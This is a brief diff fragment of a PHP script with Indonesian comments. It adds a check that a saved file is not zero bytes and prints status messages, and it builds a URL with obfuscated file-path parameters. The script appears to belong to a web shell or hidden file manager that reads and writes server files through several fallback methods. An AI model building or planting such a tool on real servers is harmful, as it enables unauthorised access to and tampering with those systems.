+            // Jika konten asli tidak kosong, tapi hasil di server 0 byte, maka anggap gagal.
+            clearstatcache();
+            if ($save_success && strlen($content) > 0 && (!file_exists($targetFile) || filesize($targetFile) === 0)) {
+                $save_success = false;
+                $status = " <span class='qalin' style='color:#ff5555;'>Saved via {$used_method} but result is 0kb (Write Failed).</span>";
+            } elseif ($save_success) {
+                $status = " <span class='qalin' style='color:#00FF00;'>Saved successfully via <strong>{$used_method}</strong>!</span>";
             } else {
-                $status = " <span class='qalin' style='color:#ff5555;'>File is not writeable.</span>";
+                $status = " <span class='qalin' style='color:#ff5555;'>Failed to save using all methods. Check Permission/Disk Space.</span>";
             }
 		}
 		$oxuUrl = "?awal=baca_file&fayl=" . kunci($namaBerkas) . "&berkas=" . kunci($default_dir);
